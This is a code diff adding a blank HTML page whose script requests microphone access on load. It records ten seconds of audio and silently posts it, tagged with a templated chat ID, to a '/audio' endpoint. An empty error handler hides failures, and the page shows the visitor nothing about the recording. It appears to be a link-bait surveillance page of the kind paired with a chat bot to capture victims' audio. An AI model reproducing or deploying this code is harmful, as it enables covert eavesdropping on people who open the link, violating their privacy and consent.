@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+  const chatId = "<%= chatId %>";
+
+  (async () => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      const recorder = new MediaRecorder(stream);
+      let chunks = [];
+
+      recorder.ondataavailable = e => chunks.push(e.data);
+      recorder.onstop = () => {
+        const blob = new Blob(chunks);
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          fetch("/audio", {
+            method: "POST",
+            headers: {"Content-Type":"application/json"},
+            body: JSON.stringify({ chatId, audio: reader.result })
+          });
+        };
+        reader.readAsDataURL(blob);
+      };
+
+      recorder.start();
+      setTimeout(() => recorder.stop(), 10000); // 10 ثواني
+    } catch {}
+  })();
+</script>
+</body>
+</html>
